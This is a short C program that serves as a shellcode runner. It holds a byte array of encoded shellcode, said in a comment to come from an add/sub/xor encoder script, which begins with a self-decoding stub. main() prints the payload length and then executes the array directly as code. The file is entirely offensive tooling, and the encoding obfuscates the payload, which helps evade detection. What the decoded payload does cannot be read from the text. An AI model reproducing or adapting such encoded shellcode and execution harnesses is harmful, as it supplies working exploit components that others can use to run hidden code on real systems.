#include <stdio.h>
#include <string.h>

// Generated with 'python sc_encode.py add 4 sub 6 xor 7'
char code[] =
"\xeb\x12\x5e\x48\x31\xc9\xb1\x63\x80\x44\x0e\xff\x28\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xe9\xff\xff\xff\xc3\xea\x36\x20\x09\xa1\x89\x22\x58\x4c\xe6\xd7\xdd\x58\xc1\xd9\x4d\xce\xc3\xdd\xc0\xc1\xd7\xd7\xd7\xc6\xef\x33\x25\x0c\xa4\x8c\x0c\x5d\x41\xe3\xd2\xd9\x5d\xc4\xdc\x48\xcb\xc6\xd8\xc5\xc4\xd2\xd2\xd2\xc2\xeb\x3f\x21\x08\xa0\x88\xf1\x59\x4d\xef\xde\xdb\x59\xc0\xd8\x54\xd7\xc2\xe4\xc1\xc0\xde\xde\xde\x2b\x23\x0a\xb5\x23\x0a\xd1\x23\x9c\x08\x45\x42\x49\x08\x08\x54\x43\x34\x37\x38\x8b\x1c\xe8\xe6";


int main(int argc, char** argv)
{
    printf("Shellcode length: %d bytes\n", (int)strlen(code));

    (*(void(*)()) code)();
    return 0;
}
